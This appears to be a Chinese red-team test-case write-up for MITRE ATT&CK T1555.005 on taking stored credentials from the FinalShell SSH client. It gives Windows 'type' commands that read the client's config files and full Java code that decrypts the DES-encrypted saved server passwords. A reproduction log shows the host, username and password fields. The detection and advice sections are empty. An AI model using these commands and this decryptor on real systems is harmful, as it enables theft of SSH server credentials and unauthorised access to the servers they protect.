# T1555-005-win-命令行获取Finalshell软件保存的公钥

## 来自ATT&CK的描述

攻击者可能从第三方密码管理器中获取用户凭证。密码管理器是存储用户凭证的应用程序，通常是在一个加密的数据库中。在用户提供主密码解锁数据库后，通常可以获得凭证。数据库被解锁后，这些凭证可以被复制到内存中。这些数据库可以以文件形式存储在磁盘上。

攻击者可以通过从内存中提取主密码或纯文本凭证，从密码管理器中获取用户凭证。攻击者可以通过密码猜解获得主密码从内存提取凭证。

## 测试案例

命令行获取finalshell软件保存的公钥。

FinalShell是一体化的的服务器，网络管理软件。不仅是ssh客户端，还是功能强大的开发，运维工具，充分满足开发，运维需求。

特色功能:

免费海外服务器远程桌面加速，ssh加速，本地化命令输入框，支持自动补全，命令历史，自定义命令参数。

命令行获取finalshell软件保存的公钥:

```yml
type c:\users\<username>\AppData\Local\finalshell\knownhosts.json
type d:\finalshell(安装路径)\knownhosts.json
```

该文件中关键字host的键值为远程服务器的SSH连接的IP和端口，关键字key的键值为该远程服务器的SSH连接的公钥。

密码存在下方文件中：

```yml
c:\Users\Administrator\AppData\Local\finalshell\conn\*********_connect_config.json
D:\software\finalshell\deleted\*********\***********_connect_config.json
```

json文件是des加密，可解密获得，打开<https://c.runoob.com/compile/10/>在线编辑器，使用下面java代码即可解密

```java
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.Random;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;

public class FinalShellDecodePass {
    public static void main(String[] args)throws Exception {
        System.out.println(decodePass("TVE5YhZeGxyOCxxxxxxCUAnkVWgAeJ3L"));
    }
    public static byte[] desDecode(byte[] data, byte[] head) throws Exception {
        SecureRandom sr = new SecureRandom();
        DESKeySpec dks = new DESKeySpec(head);
        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DES");
        SecretKey securekey = keyFactory.generateSecret(dks);
        Cipher cipher = Cipher.getInstance("DES");
        cipher.init(2, securekey, sr);
        return cipher.doFinal(data);
    }
    public static String decodePass(String data) throws Exception {
        if (data == null) {
            return null;
        } else {
            String rs = "";
            byte[] buf = Base64.getDecoder().decode(data);
            byte[] head = new byte[8];
            System.arraycopy(buf, 0, head, 0, head.length);
            byte[] d = new byte[buf.length - head.length];
            System.arraycopy(buf, head.length, d, 0, d.length);
            byte[] bt = desDecode(d, ranDomKey(head));
            rs = new String(bt);

            return rs;
        }
    }
    static byte[] ranDomKey(byte[] head) {
        long ks = 3680984568597093857L / (long)(new Random((long)head[5])).nextInt(127);
        Random random = new Random(ks);
        int t = head[0];

        for(int i = 0; i < t; ++i) {
            random.nextLong();
        }

        long n = random.nextLong();
        Random r2 = new Random(n);
        long[] ld = new long[]{(long)head[4], r2.nextLong(), (long)head[7], (long)head[3], r2.nextLong(), (long)head[1], random.nextLong(), (long)head[2]};
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        DataOutputStream dos = new DataOutputStream(bos);
        long[] var15 = ld;
        int var14 = ld.length;

        for(int var13 = 0; var13 < var14; ++var13) {
            long l = var15[var13];

            try {
                dos.writeLong(l);
            } catch (IOException var18) {
                var18.printStackTrace();
            }
        }

        try {
            dos.close();
        } catch (IOException var17) {
            var17.printStackTrace();
        }

        byte[] keyData = bos.toByteArray();
        keyData = md5(keyData);
        return keyData;
    }
    public static byte[] md5(byte[] data) {
        String ret = null;
        byte[] res=null;

        try {
            MessageDigest m;
            m = MessageDigest.getInstance("MD5");
            m.update(data, 0, data.length);
            res=m.digest();
            ret = new BigInteger(1, res).toString(16);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return res;
    }
}
```

## 检测日志

暂无，未发现Windows安全日志、Sysmon日志记录相关信息。

模拟测试环境：Windows server 2012

## 测试复现

```yml
C:\Users\Administrator>type c:\users\administrator\AppData\Local\finalshell\know
nhosts.json
{"host_list":[{"marker":"","host":"124.223.-.-","type":"ssh-rsa","key":"——————"}]}

C:\Users\Administrator>type c:\Users\Administrator\AppData\Local\finalshell\conn
\wgdw661g0vpyfqxa_connect_config.json
{"forwarding_auto_reconnect":false,"custom_size":false,"delete_time":0,"secret_k
ey_id":"","user_name":"root","remote_port_forwarding":{},"conection_type":100,
"sort_time":0,"description":"","proxy_id":"0","authentication_type":1,"drivestor
edirect":true,"delete_key_sequence":0,"password":"aaaassss————","modified_time":1664024518386,"host":"124.223.-.-","accelerate":false,"id
":"wgdw661g0vpyfqxa","height":0,"order":0,"create_time":1664024518386,"port_forw
arding_list":[],"parent_update_time":0,"rename_time":0,"backspace_key_sequence":
2,"fullscreen":false,"port":22,"terminal_encoding":"UTF-8","parent_id":"root","e
xec_channel_enable":true,"width":0,"name":"test","access_time":1664024522100}
```

## 测试留痕

未监测到有效日志

## 检测规则/思路

无

## 建议

无

## 参考推荐

MITRE-ATT&CK-T1555-005

<https://attack.mitre.org/techniques/T1555/005/>

Finalshell导出密码解密解密

<https://www.jianshu.com/p/f5bfa7b229de>
